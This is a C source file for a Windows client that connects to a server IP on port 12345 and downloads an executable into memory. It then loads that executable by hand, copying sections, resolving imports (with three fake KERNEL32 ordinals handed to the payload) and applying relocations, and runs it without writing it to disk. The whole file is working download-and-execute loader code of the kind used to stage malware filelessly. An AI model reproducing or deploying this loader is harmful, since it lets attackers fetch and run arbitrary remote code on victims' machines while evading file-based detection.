
// syntax: CLIENT.EXE <server_ip>

#include <windows.h>
#include <winsock2.h>

#include <stdio.h>
#include <stdlib.h>
#include <io.h>
#include <dos.h>

#pragma hdrstop

#define ZFTP_SERVER_PORT        12345    // port, server listens on
#define ZFTP_PACKET_SIZE        512      // packet size

#define ZFTP_CONNECT_TIMEOUT    180
#define ZFTP_RECV_TIMEOUT       120

#define MAXFILESIZE             1048576  // 1 MB

#define MIN(a,b)        ((a)<(b)?(a):(b))
#define MAX(a,b)        ((a)>(b)?(a):(b))

#include "mz.hpp"
#include "pe.hpp"
#include "log.cpp"

DWORD filesize = 0;
BYTE  filebuf[MAXFILESIZE];

// in-mem API

void quit()
{
  log("IMC:exiting\r\n");
  ExitProcess(0);
}

void WINAPI FuckMe()                    //  KERNEL32.55666
{
  log("IMC:FuckMe()\n");
  memset(filebuf, 0, MAXFILESIZE);
  quit();
}

DWORD WINAPI MySize()                   //  KERNEL32.55667
{
  return filesize;
}

BYTE* WINAPI MyData()                   //  KERNEL32.55668
{
  return &filebuf[0];
}

//

int download_file(DWORD server_ip)
{

  SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  if (s == INVALID_SOCKET)
  {
    log("IMC:ERROR:cant create socket\n");
    return 0;
  }

  DWORD nb1 = 1;
  ioctlsocket(s, FIONBIO, &nb1);

  sockaddr_in addr = {AF_INET};
  addr.sin_addr.s_addr = server_ip;
  addr.sin_port = htons(ZFTP_SERVER_PORT);

  int res = connect(s, (sockaddr*)&addr, sizeof(sockaddr));
  if ((res == SOCKET_ERROR) && (WSAGetLastError() != WSAEWOULDBLOCK))
    log("IMC:ERROR:cant connect to server, error %i\n", WSAGetLastError());
  else
  {

    fd_set writefds;
    writefds.fd_count = 1;
    writefds.fd_array[0] = s;

    timeval timeout = {ZFTP_CONNECT_TIMEOUT,0};

    if (select(1, NULL,&writefds,NULL, &timeout) == 0)
    {
      log("IMC:ERROR:connect timeout\n");
      return 0;
    }

    filesize = 0;

    for(;;)
    {

      fd_set readfds;
      readfds.fd_count = 1;
      readfds.fd_array[0] = s;

      timeval timeout = {ZFTP_RECV_TIMEOUT,0};

      if (select(1, &readfds,NULL,NULL, &timeout) == 0)
      {
        log("IMC:ERROR:recv timeout\n");
        break;
      }

      if ( filesize + ZFTP_PACKET_SIZE > sizeof(filebuf) )
      {
        log("IMC:ERROR:too big file\n");
        break;
      }

      int res = recv(s, &filebuf[filesize], ZFTP_PACKET_SIZE, 0);
      if (res == SOCKET_ERROR)
      {
        if (WSAGetLastError() == WSAEWOULDBLOCK) continue;
        log("IMC:ERROR:recv error %i\n", WSAGetLastError());
        break;
      }

      if (res == 0)  // connection closed
      {
        closesocket(s);
        filesize -= 4;
        if ( *(DWORD*)&filebuf[filesize] == 0x55AA55AA )
        {
          return 1;
        }
        else
        {
          log("IMC:ERROR:bad id\n");
          filesize = 0;
          return 0;
        }
      }

      filesize += res;

    } // main cycle

  } // connect

  closesocket(s);
  return 0;
}

int exec_file()
{
  MZ_HEADER* mz = (MZ_HEADER*) &filebuf[0];
  PE_HEADER* pe = (PE_HEADER*) &filebuf[mz->mz_neptr];
  PE_OBJENTRY* oe = (PE_OBJENTRY*) &filebuf[mz->mz_neptr+0x18+pe->pe_ntheadersize];

  DWORD imagebase = (DWORD) VirtualAlloc(NULL,pe->pe_imagesize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
  if (imagebase == NULL)
  {
    log("IMC:ERROR:can not allocate memory\n");
    return 0;
  }

//memcpy( (BYTE*)imagebase, mz, oe[0].oe_physoffs );

  for(int i=0; i<pe->pe_numofobjects; i++)
  {
    memcpy( (BYTE*)imagebase+oe[i].oe_virtrva,
            &filebuf[ oe[i].oe_physoffs ],
            oe[i].oe_physsize );
  }

  // imports

  for(PE_IMPORT* im = (PE_IMPORT*) (imagebase+pe->pe_importrva);
      im->im_name != NULL;
      im++)
  {

    HINSTANCE h = LoadLibrary( (char*)(imagebase+im->im_name) );
    if (h == NULL)
    {
      log("IMC:ERROR:can not load library %s\n",
        (char*)(imagebase+im->im_name) );
      return 0;
    }

    DWORD* lookup = (DWORD*) (imagebase+im->im_lookup);
    DWORD* addr   = (DWORD*) (imagebase+im->im_addresstable);

    for(DWORD t=*lookup; t!=NULL; t=*++lookup)
    {

      if (t & 0x80000000)
      {
        t &= 0x7FFFFFFF;        // by ordinal
        if (t==55666) *addr = (DWORD) FuckMe; else
        if (t==55667) *addr = (DWORD) MySize; else
        if (t==55668) *addr = (DWORD) MyData; else
                      *addr = (DWORD) GetProcAddress(h, (char*)t);
      }
      else
      {
        t = imagebase+t+2;      // by name, skip word-hash
        *addr = (DWORD)GetProcAddress(h, (char*)t);
      }
      if (*addr++ == NULL)
      {
        log("IMC:ERROR:can not find import function address\n");
        return 0;
      }
    }
  }

  // fixups

  PE_FIXUP* fx = (PE_FIXUP*) (imagebase+pe->pe_fixuprva);
  if ( ((pe->pe_flags & 1)==0) && (fx!=NULL) )
  {
    DWORD fx_size = pe->pe_fixupsize;
    while (fx_size)
    {
      for(DWORD i=0; i < (fx->fx_blocksize-8)/2; i++)
      {
        WORD t = fx->fx_typeoffs[i];
        if ((t >> 12) == 3)
          * (DWORD*) (imagebase + fx->fx_pagerva + (t & 0x0FFF)) +=
          imagebase - pe->pe_imagebase;
      }

      fx_size   -= fx->fx_blocksize;
      (DWORD)fx += fx->fx_blocksize;
    }
  }

  // WinMain

  __try
  {

    typedef void WinMainFunc();
    WinMainFunc* new_WinMain = (WinMainFunc*) (imagebase+pe->pe_entrypointrva);
    (*new_WinMain) ();
    // should NEVER return here
    FuckMe();

  }
  __except(1)
  {
    log("IMC:ERROR:SEH error in WinMain\n");
    FuckMe();
  }

  return 1;
}

void main(int argc, char* argv[])
{
  __try
  {
    log("IMC:startup:[%s]\n", GetCommandLine());

    if (argc!=2)
    {
      log("IMC:ERROR:syntax IMC.EXE <server_ip>\n");
      quit();
    }

    WSADATA WSAData;
    if ( WSAStartup(MAKEWORD(1,1), &WSAData) != 0 )
    {
      log("WSAStartup failed\n");
      return;
    }

    int res = download_file( inet_addr(argv[1]) );
    if (!res)
      log("IMC:ERROR:download failed\n");

    WSACleanup();

    if (res)
    {
      if ( !exec_file() )
        log("IMC:ERROR:execution failed\n");
    }

  }//__try
  __except(1)
  {
    log("IMC:ERROR:SEH error\n");
  }

  quit();

} // main
